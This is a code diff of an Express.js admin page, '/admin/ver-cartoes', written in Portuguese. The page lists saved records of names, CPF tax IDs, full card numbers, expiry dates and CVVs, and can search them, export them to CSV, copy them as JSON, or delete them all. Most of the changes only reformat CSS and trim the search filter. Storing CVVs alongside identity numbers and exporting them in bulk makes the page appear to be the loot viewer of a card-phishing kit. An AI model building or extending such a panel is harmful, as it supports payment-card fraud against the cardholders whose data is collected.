@@ -175,6 +175,7 @@ app.use((req, res) => {
 });
 
 // 🆕 NOVO - ADMIN - VISUALIZAR CARTÕES SALVOS NO LOCALSTORAGE
+// ====================== ADMIN - VISUALIZAR CARTÕES SALVOS ======================
 app.get('/admin/ver-cartoes', (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -193,61 +194,19 @@ app.get('/admin/ver-cartoes', (req, res) => {
                 }
                 .container { max-width: 1200px; margin: 0 auto; }
                 h1 { text-align: center; margin-bottom: 20px; color: #ffb600; }
-                .stats {
-                    background: #0f3460;
-                    padding: 15px;
-                    border-radius: 10px;
-                    margin-bottom: 20px;
-                    display: flex;
-                    justify-content: space-between;
-                    flex-wrap: wrap;
-                    gap: 10px;
-                }
-                .stat-card {
-                    background: #16213e;
-                    padding: 10px 20px;
-                    border-radius: 8px;
-                    border-left: 4px solid #ffb600;
-                }
-                .card {
-                    background: #0f3460;
-                    border-radius: 12px;
-                    padding: 20px;
-                    margin-bottom: 15px;
-                    border-left: 4px solid #ffb600;
-                    transition: transform 0.2s;
-                }
+                .stats { background: #0f3460; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
+                .stat-card { background: #16213e; padding: 10px 20px; border-radius: 8px; border-left: 4px solid #ffb600; }
+                .card { background: #0f3460; border-radius: 12px; padding: 20px; margin-bottom: 15px; border-left: 4px solid #ffb600; transition: transform 0.2s; }
                 .card:hover { transform: translateX(5px); }
                 .card h3 { color: #ffb600; margin-bottom: 10px; }
                 .card p { margin: 5px 0; font-size: 14px; }
                 .card .label { color: #888; }
-                .button-group {
-                    display: flex;
-                    gap: 10px;
-                    margin-bottom: 20px;
-                    flex-wrap: wrap;
-                }
-                button {
-                    background: #ffb600;
-                    color: #004aad;
-                    border: none;
-                    padding: 10px 20px;
-                    border-radius: 8px;
-                    cursor: pointer;
-                    font-weight: bold;
-                    transition: all 0.2s;
-                }
+                .button-group { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
+                button { background: #ffb600; color: #004aad; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: all 0.2s; }
                 button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,182,0,0.3); }
                 .btn-danger { background: #dc3545; color: white; }
                 .btn-danger:hover { background: #c82333; }
-                .search-box {
-                    width: 100%;
-                    padding: 10px;
-                    margin-bottom: 20px;
-                    border-radius: 8px;
-                    border: none;
-                    font-size: 16px;
-                }
+                .search-box { width: 100%; padding: 10px; margin-bottom: 20px; border-radius: 8px; border: none; font-size: 16px; }
                 .empty { text-align: center; padding: 40px; background: #0f3460; border-radius: 12px; }
                 footer { text-align: center; margin-top: 30px; padding: 20px; color: #888; font-size: 12px; }
             </style>
@@ -266,13 +225,12 @@ app.get('/admin/ver-cartoes', (req, res) => {
                     <button onclick="copiarJSON()">📋 Copiar JSON</button>
                     <button class="btn-danger" onclick="limparDados()">🗑️ Limpar Todos</button>
                 </div>
-                <input type="text" class="search-box" id="search" placeholder="🔍 Buscar por nome, CPF, cartão ou e-mail..." onkeyup="filtrarDados()">
+                <input type="text" class="search-box" id="search" placeholder="🔍 Buscar por nome, CPF, cartão..." onkeyup="filtrarDados()">
                 <div id="lista-cartoes"></div>
                 <footer>⚠️ Acesso restrito - Apenas administradores</footer>
             </div>
             <script>
                 let todosCartoes = [];
-                
                 function carregarDados() {
                     const dados = localStorage.getItem('cartoes_salvos');
                     if (dados) {
@@ -284,7 +242,6 @@ app.get('/admin/ver-cartoes', (req, res) => {
                         document.getElementById('total').textContent = '0';
                     }
                 }
-                
                 function atualizarStats() {
                     const total = todosCartoes.length;
                     let totalValor = 0;
@@ -299,14 +256,12 @@ app.get('/admin/ver-cartoes', (req, res) => {
                         document.getElementById('ultimo').textContent = ultimo.data || 'N/A';
                     }
                 }
-                
                 function atualizarDisplay() {
                     const searchTerm = document.getElementById('search').value.toLowerCase();
                     const filtrados = todosCartoes.filter(c => 
                         c.nome.toLowerCase().includes(searchTerm) ||
                         (c.cpf && c.cpf.includes(searchTerm)) ||
-                        (c.cartao && c.cartao.includes(searchTerm)) ||
-                        (c.email && c.email.toLowerCase().includes(searchTerm))
+                        (c.cartao && c.cartao.includes(searchTerm))
                     );
                     const container = document.getElementById('lista-cartoes');
                     if (filtrados.length === 0) {
@@ -326,15 +281,11 @@ app.get('/admin/ver-cartoes', (req, res) => {
                         </div>
                     \`).join('');
                 }
-                
                 function filtrarDados() { atualizarDisplay(); }
-                
                 function exportarCSV() {
                     if (todosCartoes.length === 0) { alert('Nenhum dado para exportar'); return; }
                     const headers = ['Nome', 'CPF', 'Cartão', 'Validade', 'CVV', 'E-mail', 'Valor', 'Data'];
-                    const linhas = todosCartoes.map(c => [
-                        c.nome, c.cpf, c.cartao, c.validade, c.cvv, c.email, c.valor, c.data
-                    ].map(v => \`"\${v || ''}"\`).join(','));
+                    const linhas = todosCartoes.map(c => [c.nome, c.cpf, c.cartao, c.validade, c.cvv, c.email, c.valor, c.data].map(v => \`"\${v || ''}"\`).join(','));
                     const csv = [headers.join(','), ...linhas].join('\\n');
                     const blob = new Blob([csv], { type: 'text/csv' });
                     const url = URL.createObjectURL(blob);
@@ -344,13 +295,11 @@ app.get('/admin/ver-cartoes', (req, res) => {
                     a.click();
                     URL.revokeObjectURL(url);
                 }
-                
                 function copiarJSON() {
                     const json = JSON.stringify(todosCartoes, null, 2);
                     navigator.clipboard.writeText(json);
                     alert('✅ JSON copiado para a área de transferência!');
                 }
-                
                 function limparDados() {
                     if (confirm('⚠️ ATENÇÃO! Isso vai apagar TODOS os dados salvos. Continuar?')) {
                         localStorage.removeItem('cartoes_salvos');
@@ -359,7 +308,6 @@ app.get('/admin/ver-cartoes', (req, res) => {
                         alert('✅ Todos os dados foram removidos!');
                     }
                 }
-                
                 carregarDados();
             </script>
         </body>
